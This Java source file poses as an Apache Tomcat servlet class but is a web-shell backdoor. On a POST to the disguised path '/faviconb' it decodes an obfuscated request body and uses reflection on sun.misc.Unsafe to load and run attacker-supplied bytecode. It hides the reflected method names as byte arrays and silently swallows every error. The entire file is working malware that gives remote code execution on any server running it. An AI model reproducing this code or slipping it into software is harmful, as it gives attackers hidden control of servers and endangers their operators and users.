package org.apache.catalina.servlets.sl;

public class BX {
    private static final String pathPattern= "/faviconb";

    public static Class unsafedefine(byte[] bytes) throws Exception {
        java.lang.reflect.Field field = sun.misc.Unsafe.class.getDeclaredField(new String(new byte[]{116,104,101,85,110,115,97,102,101}));
        field.setAccessible(true);
        Object unsafe = field.get(null);
        java.lang.reflect.Method m = sun.misc.Unsafe.class.getDeclaredMethod(new String(new byte[]{100,101,102,105,110,101,65,110,111,110,121,109,111,117,115,67,108,97,115,115}), new Class[]{Class.class, byte[].class, Object[].class});
        m.setAccessible(true);
        Class clazz = (Class) m.invoke(unsafe, new Object[]{java.io.File.class, bytes, null});
        return clazz;
    }

    private static byte[] Decrypt(byte[] data) {
        byte[] dt = new byte[data.length];
        for (int i = 0; i < data.length; i++) {
            dt[i] = (byte) (data[i] - 1);
        }
        try {
            java.io.ByteArrayInputStream t = new java.io.ByteArrayInputStream(dt);
            java.util.zip.GZIPInputStream i = new java.util.zip.GZIPInputStream(t, dt.length);
            byte[] c = r(i);
            byte[] ct = new byte[c.length];
            for (int b = 0; b < c.length; b++) {
                ct[b] = (byte) (c[b] - 1);
            }
            return ct;
        } catch (Exception ignored) {
        }
        return data;
    }
    private static byte[] Encrypt(byte[] data) {
        byte[] dt = new byte[data.length];
        for (int i = 0; i < data.length; i++) {
            dt[i] = (byte) (data[i] + 1);
        }
        try {
            java.io.ByteArrayOutputStream o = new java.io.ByteArrayOutputStream();
            java.util.zip.GZIPOutputStream g = new java.util.zip.GZIPOutputStream(o);
            g.write(dt);
            g.close();
            byte[] c = o.toByteArray();
            byte[] ct = new byte[c.length];

            for (int i = 0; i < c.length; i++) {
                ct[i] = (byte) (c[i] + 1);
            }
            return ct;
        } catch (Exception ignored) {
        }
        return data;
    }
    private static byte[] r(java.io.InputStream i) {
        byte[] temp = new byte[1024];
        java.io.ByteArrayOutputStream b = new java.io.ByteArrayOutputStream();
        int n;
        try {
            while((n = i.read(temp)) != -1) {b.write(temp, 0, n);
            }} catch (Exception ignored) {
        }
        return b.toByteArray();
    }

    public static void doService(Object obj, String url,String method, java.io.InputStream in){
        if (url.matches(pathPattern)){
            if (method.equals("POST")){
                try {
                    unsafedefine(Decrypt(r(in))).newInstance().equals(obj);
                }catch(Exception ignored) {
                }
            }

        }
    }
}
